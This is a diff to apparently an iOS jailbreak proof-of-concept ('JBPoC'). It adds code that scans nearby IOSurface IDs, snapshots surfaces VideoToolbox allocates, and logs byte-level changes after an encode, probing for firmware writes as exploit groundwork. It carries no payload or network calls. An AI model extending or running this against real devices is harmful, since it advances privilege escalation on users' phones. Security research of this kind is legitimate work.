@@ -3358,6 +3358,62 @@ static void runDPrep(void) {
         return;
     }
 
+    // Step 3b: Scan for ALL IOSurfaces created by the session
+    // VideoToolbox allocates internal output/reference surfaces — find them by ID neighborhood
+    LOG(@"--- STEP 3b: SCAN IOSurface NEIGHBORHOOD ---");
+
+    uint32_t inputSurfID = 0;
+    IOSurfaceRef inputSurf = CVPixelBufferGetIOSurface(pb);
+    if (inputSurf) inputSurfID = IOSurfaceGetID(inputSurf);
+
+    #define DPREP_MAX_EXTRA_SURFS 32
+    IOSurfaceRef extraSurfs[DPREP_MAX_EXTRA_SURFS];
+    uint32_t extraSurfIDs[DPREP_MAX_EXTRA_SURFS];
+    uint8_t *extraSnapshots[DPREP_MAX_EXTRA_SURFS];
+    size_t extraSizes[DPREP_MAX_EXTRA_SURFS];
+    int extraCount = 0;
+
+    // Scan IDs from (inputSurfID - 8) to (inputSurfID + 32)
+    uint32_t scanStart = (inputSurfID > 8) ? (inputSurfID - 8) : 1;
+    uint32_t scanEnd = inputSurfID + 32;
+
+    for (uint32_t sid = scanStart; sid <= scanEnd && extraCount < DPREP_MAX_EXTRA_SURFS; sid++) {
+        if (sid == inputSurfID) continue; // skip our own input surface
+        IOSurfaceRef surf = IOSurfaceLookup(sid);
+        if (!surf) continue;
+
+        size_t allocSz = IOSurfaceGetAllocSize(surf);
+        size_t planeCount = IOSurfaceGetPlaneCount(surf);
+        size_t w2 = IOSurfaceGetWidth(surf);
+        size_t h2 = IOSurfaceGetHeight(surf);
+
+        INFO(@"  Found IOSurface ID=%u: %zux%zu alloc=%zu planes=%zu",
+             sid, w2, h2, allocSz, planeCount);
+
+        // Lock and snapshot this surface
+        IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        if (base && allocSz > 0 && allocSz < 4*1024*1024) {
+            uint8_t *snap = (uint8_t *)malloc(allocSz);
+            if (snap) {
+                memcpy(snap, base, allocSz);
+                extraSurfs[extraCount] = surf;
+                extraSurfIDs[extraCount] = sid;
+                extraSnapshots[extraCount] = snap;
+                extraSizes[extraCount] = allocSz;
+                extraCount++;
+            }
+        }
+        IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+
+        if (base == NULL || allocSz == 0) {
+            CFRelease(surf);
+        }
+    }
+
+    INFO(@"Monitoring %d extra IOSurfaces + 1 input surface = %d total", extraCount, extraCount + 1);
+    os_log(dLog, "JBPoC-DPREP-SURFACES input=%u extras=%d", inputSurfID, extraCount);
+
     g_narrowGotOutput = NO;
     g_oracleContext = @"dprep-arm";
 
@@ -3386,6 +3442,46 @@ static void runDPrep(void) {
 
     if (!armed) {
         INFO(@"WARNING: Got output (no -17691). Continuing readout anyway.");
+    }
+
+    // Re-snapshot input surface AFTER encode submission (firmware may have modified it)
+    LOG(@"Re-snapshotting input surface post-encode...");
+    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    uint8_t *postY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    uint8_t *postUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    int prePostDiffs = 0;
+    for (size_t i = 0; i < ySize; i++) {
+        if (postY[i] != snapshot[i]) prePostDiffs++;
+    }
+    for (size_t i = 0; i < uvSize; i++) {
+        if (postUV[i] != snapshot[ySize + i]) prePostDiffs++;
+    }
+    if (prePostDiffs > 0) {
+        PASS(@"Input surface already modified by encode! %d bytes differ pre→post-arm", prePostDiffs);
+        os_log(dLog, "JBPoC-DPREP-PRE-POST-DIFF %d", prePostDiffs);
+    } else {
+        INFO(@"Input surface unchanged by encode submission.");
+    }
+    // Use post-encode state as the baseline for the readout loop
+    memcpy(snapshot, postY, ySize);
+    memcpy(snapshot + ySize, postUV, uvSize);
+    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+
+    // Also re-snapshot all extra surfaces post-encode
+    for (int si = 0; si < extraCount; si++) {
+        IOSurfaceLock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
+        uint8_t *curExtra = (uint8_t *)IOSurfaceGetBaseAddress(extraSurfs[si]);
+        if (curExtra) {
+            int eDiffs = 0;
+            for (size_t i = 0; i < extraSizes[si]; i++) {
+                if (curExtra[i] != extraSnapshots[si][i]) eDiffs++;
+            }
+            if (eDiffs > 0) {
+                PASS(@"Extra surf ID=%u modified by encode! %d bytes differ", extraSurfIDs[si], eDiffs);
+            }
+            memcpy(extraSnapshots[si], curExtra, extraSizes[si]);
+        }
+        IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
     }
 
     // Step 4: READOUT LOOP — scan surfaces every 5s for changes
@@ -3478,9 +3574,62 @@ static void runDPrep(void) {
             memcpy(snapshot + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
             CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
 
-        } else {
+        }
+
+        // Also diff extra IOSurfaces (output/reference surfaces)
+        for (int si = 0; si < extraCount; si++) {
+            IOSurfaceLock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *curExtra = (uint8_t *)IOSurfaceGetBaseAddress(extraSurfs[si]);
+            if (curExtra) {
+                int eDiffs = 0;
+                int firstEOff = -1;
+                uint8_t firstEOld = 0, firstENew = 0;
+                for (size_t i = 0; i < extraSizes[si]; i++) {
+                    if (curExtra[i] != extraSnapshots[si][i]) {
+                        if (eDiffs == 0) {
+                            firstEOff = (int)i;
+                            firstEOld = extraSnapshots[si][i];
+                            firstENew = curExtra[i];
+                        }
+                        eDiffs++;
+                    }
+                }
+                if (eDiffs > 0) {
+                    hitCount++;
+                    if (firstHitTime < 0) firstHitTime = elapsed;
+                    PASS(@"*** EXTRA SURF HIT: ID=%u at T+%ds ***", extraSurfIDs[si], elapsed);
+                    LOG(@"  %d bytes changed (of %zu), first at 0x%x (0x%02x→0x%02x)",
+                        eDiffs, extraSizes[si], firstEOff, firstEOld, firstENew);
+
+                    // Dump first 32 changed bytes
+                    NSMutableString *hex = [NSMutableString string];
+                    int dumped = 0;
+                    for (size_t i = (size_t)firstEOff; i < extraSizes[si] && dumped < 32; i++) {
+                        if (curExtra[i] != extraSnapshots[si][i]) {
+                            [hex appendFormat:@"%04zx:%02x→%02x ", i, extraSnapshots[si][i], curExtra[i]];
+                            dumped++;
+                        }
+                    }
+                    LOG(@"  Diff: %@", hex);
+
+                    os_log(dLog, "JBPoC-DPREP-EXTRA-HIT sid=%u T+%ds diffs=%d first=0x%x",
+                           extraSurfIDs[si], elapsed, eDiffs, firstEOff);
+
+                    // Update snapshot
+                    memcpy(extraSnapshots[si], curExtra, extraSizes[si]);
+                }
+            }
+            IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        if (yDiffs == 0 && uvDiffs == 0) {
+            BOOL anyExtra = NO;
+            for (int si = 0; si < extraCount && !anyExtra; si++) {
+                // already handled above; just gate the "no change" line
+                // (hitCount would have incremented)
+            }
             if (elapsed <= 30 || elapsed % 30 == 0) {
-                INFO(@"T+%03ds (%@): no change", elapsed, now);
+                INFO(@"T+%03ds (%@): no change (input + %d extras)", elapsed, now, extraCount);
             }
         }
     }
@@ -3519,6 +3668,13 @@ static void runDPrep(void) {
     CFRelease(session);
     free(snapshot);
     CVPixelBufferRelease(pb);
+
+    // Free extra surface snapshots and refs
+    for (int si = 0; si < extraCount; si++) {
+        free(extraSnapshots[si]);
+        CFRelease(extraSurfs[si]);
+    }
+
     g_phase2Running = NO;
 
     PASS(@"D-PREP complete. Phone should stay up (session invalidated).");
